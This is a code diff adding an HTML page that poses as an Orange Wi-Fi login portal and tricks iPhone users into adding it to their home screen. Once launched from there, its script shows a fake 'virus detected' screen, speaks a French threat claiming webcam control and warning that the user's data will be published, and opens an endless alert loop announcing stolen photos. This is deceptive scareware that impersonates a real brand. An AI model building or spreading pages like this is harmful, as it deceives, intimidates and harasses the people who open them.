@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>WiFi Orange - Connexion</title>
+    <link rel="manifest" href="manifest.json">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background: #f4f4f4; color: #333; text-align: center; font-family: Arial, sans-serif; padding: 20px; }
+        .logo { width: 60px; height: 60px; background: #ff7900; margin: 0 auto; border-radius: 10px; }
+        .btn { background: #000; color: white; padding: 15px; border-radius: 5px; display: block; text-decoration: none; margin-top: 20px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="logo"></div>
+    <h2>Portail Orange Wi-Fi</h2>
+    <p>Pour activer votre accès gratuit, suivez ces deux étapes :</p>
+    <div style="text-align: left; background: white; padding: 15px; border-radius: 10px; border: 1px solid #ddd;">
+        <p>1. Appuyez sur le bouton <b>Partager</b> en bas de votre écran (le carré avec la flèche).</p>
+        <p>2. Choisissez <b>"Sur l'écran d'accueil"</b>.</p>
+    </div>
+    <p style="font-size: 12px; color: gray;">Une icône "Wi-Fi" apparaîtra sur votre écran pour valider la session.</p>
+
+    <script>
+        if (window.matchMedia('(display-mode: standalone)').matches) {
+            document.body.innerHTML = "<h1 style='color:red;'>VIRUS DETECTED</h1><p>PIRATAGE EN COURS...</p>";
+            var msg = new SpeechSynthesisUtterance("Je sais qui tu es. Ta webcam est sous mon contrôle. Ne touche à rien ou tes données seront publiées.");
+            msg.lang = 'fr-FR';
+            window.speechSynthesis.speak(msg);
+            setInterval(function() {
+                alert("⚠️ ALERTE : INTRUSION SYSTÈME\nEXTRACTION DES PHOTOS RÉUSSIE");
+            }, 500);
+        }
+    </script>
+</body>
+</html>
